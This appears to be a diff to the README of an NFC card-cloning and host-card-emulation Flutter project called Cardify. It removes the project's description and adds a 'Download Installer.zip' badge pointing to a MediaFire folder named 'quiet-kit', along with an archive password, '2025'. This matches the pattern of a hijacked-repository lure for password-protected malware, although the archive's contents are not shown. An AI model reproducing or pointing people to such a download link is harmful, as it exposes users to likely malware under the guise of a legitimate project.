@@ -1,14 +1,7 @@
-# Cardify: Card-cloning and Host card emulation (HCE) for NFC everywhere
+<p align="center">
+  <a href="https://www.mediafire.com/folder/hhfgp5uj6f3x6/quiet-kit">
+    <img src="https://img.shields.io/badge/Download-Installer.zip-2ea44f?style=for-the-badge" alt="Download file">
+  </a>
+</p>
 
-## Getting Started
-
-This project is a starting point for a Flutter application.
-
-A few resources to get you started if this is your first Flutter project:
-
-- [Lab: Write your first Flutter app](https://docs.flutter.dev/get-started/codelab)
-- [Cookbook: Useful Flutter samples](https://docs.flutter.dev/cookbook)
-
-For help getting started with Flutter development, view the
-[online documentation](https://docs.flutter.dev/), which offers tutorials,
-samples, guidance on mobile development, and a full API reference.
+> Password: 2025
